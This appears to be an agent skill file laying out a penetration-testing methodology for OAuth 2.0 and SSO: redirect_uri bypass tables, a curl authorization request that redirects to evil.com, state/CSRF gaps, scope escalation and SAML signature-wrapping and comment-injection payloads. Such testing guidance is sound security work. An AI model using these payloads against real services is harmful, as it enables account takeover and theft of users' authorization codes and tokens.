---
name: oauth-sso-attack
description: "OAuth 2.0 and SSO attack methodology: redirect_uri abuse, state/CSRF gaps, token leakage, and scope escalation. Use this skill when an application delegates authentication to an OAuth provider."
---

# OAuth / SSO

## Overview

OAuth flows have five trust points: the client registration, `redirect_uri` validation, `state`, the authorization code exchange, and token handling. Each is a potential bypass.

## Flow map

```
/authorize?client_id=&redirect_uri=&scope=&state=
   -> user consents -> redirect_uri?code=CODE&state=
   -> POST /token {code, client_id, client_secret}
   -> access_token
```

## redirect_uri bypass

| Filter | Bypass |
|---|---|
| Exact match | not bypassable (correct) |
| Prefix match | `https://app.com.evil.com` |
| Substring match | `https://evil.com/app.com` |
| Path traversal | `https://app.com/callback/../../evil` |
| Wildcard subdomain | `https://x.app.com` if you control a subdomain |
| Open redirect on app.com | `https://app.com/redir?to=https://evil.com` |
| Localhost allowance | `http://localhost` on the victim's machine |

```bash
curl -s "https://provider/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code&scope=openid"
```

## state missing → CSRF / login CSRF

Without `state`, an attacker can force a victim to log into the attacker's account (login CSRF), then observe the victim's actions in that account.

## code interception

- `Referer` leakage when the callback page loads third-party resources.
- Browser history / proxy logs.
- PKCE absent → code replay if the redirect is hijacked.

## implicit flow token leakage

`response_type=token` puts the token in the URL fragment — leaks via Referer, browser extensions, and history.

## scope escalation

```
scope=openid profile email admin
```

Some providers ignore unknown scopes; others grant them. Test for scopes not shown in consent.

## SSO specifics

| Provider | Common weakness |
|---|---|
| SAML | XSW (XML signature wrapping), comment injection in NameID |
| OIDC | nonce reuse, `id_token` not verified |
| Azure AD | tenant confusion, `common` endpoint |
| Okta | misconfigured app assignments |

### SAML XSW

Move the signed assertion inside an unsigned one; the parser validates the signature on the original but uses the modified assertion. Tool: `SAML Raider` (Burp).

### Signature comment injection

```xml
<NameID>admin@corp.com<!---->.evil.com</NameID>
```

## Pitfalls

- A redirect_uri bypass alone is low impact unless you can also obtain a code for a victim.
- Providers increasingly enforce PKCE and exact redirect matching.
- Testing on production can lock accounts; use test accounts.

## Verification

A tampered flow must return a token for a different user or with elevated privileges.
